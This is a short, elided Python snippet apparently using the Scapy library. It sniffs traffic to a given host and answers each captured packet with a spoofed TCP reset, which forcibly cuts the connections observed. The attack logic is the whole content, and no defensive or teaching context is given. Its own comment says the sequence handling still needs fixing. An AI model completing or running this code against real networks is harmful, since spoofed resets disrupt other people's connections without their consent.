...
def logRST(p):
    ...
    sendRST(dst_ip, dst_port, src_ip, src_port, ack)
...
def sendRST(dst_ip, dst_port, src_ip, src_port, ack):
    ip = IP(src=dst_ip, dst=src_ip)
    tcp = TCP(sport=dst_port, dport=src_port, flags="R", seq=ack)#Fix seq + ack
    p = Ether()/ip/tcp
    sendp(p, iface="en0")
...
def sniffPackets(DST_IP):
    ...
    p = sniff(filter="host " + DST_IP, prn=logRST, count=10)
